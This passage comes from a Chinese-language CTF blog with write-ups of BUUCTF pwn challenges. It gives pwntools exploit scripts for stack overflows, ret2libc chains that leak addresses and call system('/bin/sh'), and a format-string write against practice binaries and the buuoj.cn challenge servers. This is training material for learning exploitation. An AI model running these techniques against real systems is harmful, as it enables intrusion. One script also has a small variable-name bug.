<span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="40-jarviso-level4"><a href="#40-jarviso-level4" class="headerlink" title="40 jarviso_level4"></a>40 jarviso_level4</h2><p><em><strong>ret2libc</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28452</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(sys)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-22 23:45:27" itemprop="dateModified" datetime="2025-02-22T23:45:27+08:00">2025-02-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="buuctf刷题记录（1-20题）"><a href="#buuctf刷题记录（1-20题）" class="headerlink" title="buuctf刷题记录（1-20题）"></a>buuctf刷题记录（1-20题）</h1><p>by Maple</p>
<p><em>有人说我的前面的题解没解析，看不懂？那我来补上了</em></p>
<h2 id="1-test-nc"><a href="#1-test-nc" class="headerlink" title="1 test_nc"></a>1 test_nc</h2><p><code>nc 节点 端口</code></p>
<blockquote>
<p>没有nc？去看<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">这篇！</a></p>
</blockquote>
<p>然后<code>cat flag</code></p>
<ul>
<li>cat:catch 抓住。就是显示文件中的内容</li>
</ul>
<h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2 rip"></a>2 rip</h2><p>打开ida看下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到一个不限制输入长度的<code>gets()</code>函数，并且根据ida的分析，s位于栈底（rbp）上方<code>0xF</code>处,那么我们输入0xF字节之后再覆盖掉rbp，是不是就到了rbp下面的返回地址处？那么我们把后门函数的地址写在返回地址处，不就可以跳转到后门函数了嘛</p>
<blockquote>
<p>为什么rbp下面是返回地址？罚你看<a href="../basic/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A.md">这篇</a></p>
</blockquote>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x40118a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3 warmup_csaw_2016"></a>3 warmup_csaw_2016</h2><p>和上一题是一样的，可以将v5和rbp覆盖，然后篡改返回地址</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28694</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell</p>
<h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4 ciscn_2019_n_1"></a>4 ciscn_2019_n_1</h2><p>看下ida逆出来的代码</p>
<p><img src="/./images/image-20250222233345553.png" alt="image-20250222233345553"></p>
<p>发现想要获取flag的内容，需要<code>v2=11.28125</code>,但是，我们一定要让if执行嘛，一定要合程序的意嘛，都打pwn了，怎么可以顺着程序的意来呢</p>
<p>所以有两种思路，一种是覆盖返回地址，一种是覆盖v2</p>
<ol>
<li><p>覆盖返回地址，直接<code>return system</code>处</p>
<p>exp:</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">retaddr=<span class="number">0x4006BE</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(retaddr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>覆盖v2数值</p>
<p>可以看到我们的输入是在v2赋值之后的事，所以可以通过溢出来把v2的值给覆盖了，<code>0x2c = 0x30-0x4</code></p>
<blockquote>
<p>不知道为什么填充的是<code>0x4138000</code>?学一下浮点数的存储叭，或者，按下tab，对准那个黄色的地方双击（如果不是这样子的话按下空格）</p>
<img src="./images/image-20250222234229981.png" alt="image-20250222234229981" style="zoom: 50%;" />

<p>你就得到了11.28125的十六进制存储</p>
<p><img src="/./images/image-20250222234041347.png" alt="image-20250222234041347"></p>
</blockquote>
</li>
</ol>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5 pwn1_sctf_2016"></a>5 pwn1_sctf_2016</h2><p>限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><em>这次学好了，先在本地创建了一个<code>flag.txt</code>的文件</em></p>
<h2 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6 jarvisoj_level0"></a>6 jarvisoj_level0</h2><p>ret2text不多说了(用了下自己的模板，有很多不需要)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;,)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x40059A</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="7-第五空间2019-决赛-PWN5"><a href="#7-第五空间2019-决赛-PWN5" class="headerlink" title="7 [第五空间2019 决赛]PWN5"></a>7 [第五空间2019 决赛]PWN5</h2><p>有一个很好用的pwntools语法：</p>
<h3 id="fmtstr-payload-number-addr-value"><a href="#fmtstr-payload-number-addr-value" class="headerlink" title="fmtstr_payload(number,{addr:value})"></a><code>fmtstr_payload(number,&#123;addr:value&#125;)</code></h3><ul>
<li><code>number</code>表示偏移字节数，<code>addr</code>为你要写入的地址，<code>value</code>为你要更改为的数值</li>
</ul>
<p>这里分析题目可以发现，我们在buf段溢出，然后覆盖<code>dword_804C044</code>，再输入相同的覆盖值就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804C044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="8-jarvisoj-level2"><a href="#8-jarvisoj-level2" class="headerlink" title="8 jarvisoj_level2"></a>8 jarvisoj_level2</h2><p>一个32位的题目，和64位有些区别，但不多</p>
<p><strong>32位<code>system（）</code>利用栈传参，不用寄存器</strong>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x8048320</span>	<span class="comment"># system的地址</span></span><br><span class="line">binsh = <span class="number">0x804A024</span>	<span class="comment">#binsh的地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(sys)+p32(<span class="number">1</span>)+p32(binsh)</span><br><span class="line"><span class="comment">#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="9-ciscn-2019-n-8"><a href="#9-ciscn-2019-n-8" class="headerlink" title="9 ciscn_2019_n_8"></a>9 ciscn_2019_n_8</h2><p>可以发现如果var[13]是17就getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">17</span>)*<span class="number">14</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="10-bjdctf-2020-babystack"><a href="#10-bjdctf-2020-babystack" class="headerlink" title="10 bjdctf_2020_babystack"></a>10 bjdctf_2020_babystack</h2><p>自定义输入长度，栈溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x4006EA</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="11-ciscn-2019-c-1"><a href="#11-ciscn-2019-c-1" class="headerlink" title="11 ciscn_2019_c_1"></a>11 ciscn_2019_c_1</h2><p>ret2libc，加密的地方可以溢出，<strong>可以在输入的地方输入一个’\0’绕开加密过程</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26071</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x50</span>+<span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(offset-<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">Offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh = Offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = Offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(offset-<span class="number">1</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="12-jarvisoj-level2-x64"><a href="#12-jarvisoj-level2-x64" class="headerlink" title="12 jarvisoj_level2_x64"></a>12 jarvisoj_level2_x64</h2><p>rdi传递binsh</p>
<p>又是本地打不通，远程可以打通，不理解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,28182)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">binsh = <span class="number">0x600A90</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x00000000004004a1</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span 